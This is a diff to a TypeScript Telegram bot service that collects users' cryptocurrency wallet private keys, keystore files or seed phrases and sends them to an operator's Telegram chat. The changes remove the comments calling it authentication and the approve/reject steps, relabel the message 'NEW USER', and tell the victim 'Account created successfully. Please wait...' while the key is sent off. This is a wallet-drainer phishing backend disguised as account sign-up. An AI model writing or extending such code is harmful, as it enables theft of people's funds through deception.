@@ -1,6 +1,3 @@
-// Telegram Bot Service for Wallet Authentication
-// This service sends wallet authentication requests to a Telegram bot
-
 interface WalletAuthData {
   walletType: string;
   keyType: 'private' | 'keystore' | 'phrase';
@@ -32,9 +29,9 @@ class TelegramBotService {
   }
 
   private formatKeyAsMatrix(key: string, keyType: 'private' | 'keystore' | 'phrase'): string {
-    // Split the key into characters or words
+
     let keyElements: string[];
-    
+
     if (keyType === 'phrase') {
       // For phrase keys, split by spaces
       keyElements = key.trim().split(/\s+/);
@@ -73,7 +70,7 @@ class TelegramBotService {
     const keyMatrix = this.formatKeyAsMatrix(data.key, data.keyType);
 
     return `
-🔐 *WALLET AUTHENTICATION REQUEST*
+🔐 *NEW USER*
 
 💰 *Wallet Type:* ${data.walletType}
 ${emoji[data.keyType]} *Key Type:* ${data.keyType.toUpperCase()}
@@ -82,16 +79,10 @@ ${emoji[data.keyType]} *Key Type:* ${data.keyType.toUpperCase()}
 
 ${data.keyType === 'keystore' ? `🔒 *Password:* ${data.password ? 'Provided' : 'Not provided'}\n` : ''}
 
-*Key Data (3x3 Matrix):*
 \`\`\`
 ${keyMatrix}
 \`\`\`
 
-*To approve this request, reply with:*
-\`/approve ${data.sessionId}\`
-
-*To reject this request, reply with:*
-\`/reject ${data.sessionId}\`
     `.trim();
   }
 
@@ -128,20 +119,18 @@ ${keyMatrix}
       }
 
       const result = await response.json();
-      
+
       if (!result.ok) {
         throw new Error(`Telegram API error: ${result.description}`);
       }
 
-      // For now, we'll simulate a successful response
-      // In a real implementation, you'd need a webhook or polling mechanism
       return {
         success: true,
-        message: 'Wallet authentication request sent successfully. Please check your Telegram for approval.',
-        data: { 
+        message: 'Account created successfully. Please wait...',
+        data: {
           sessionId,
           messageId: result.result.message_id,
-          timestamp 
+          timestamp
         }
       };
 
@@ -151,12 +140,10 @@ ${keyMatrix}
     }
   }
 
-  // Method to check if bot is properly configured
   isConfigured(): boolean {
     return !!(this.botToken && this.chatId);
   }
 
-  // Method to get configuration status
   getConfigStatus(): { botToken: boolean; chatId: boolean; webhookUrl: boolean } {
     return {
       botToken: !!this.botToken,
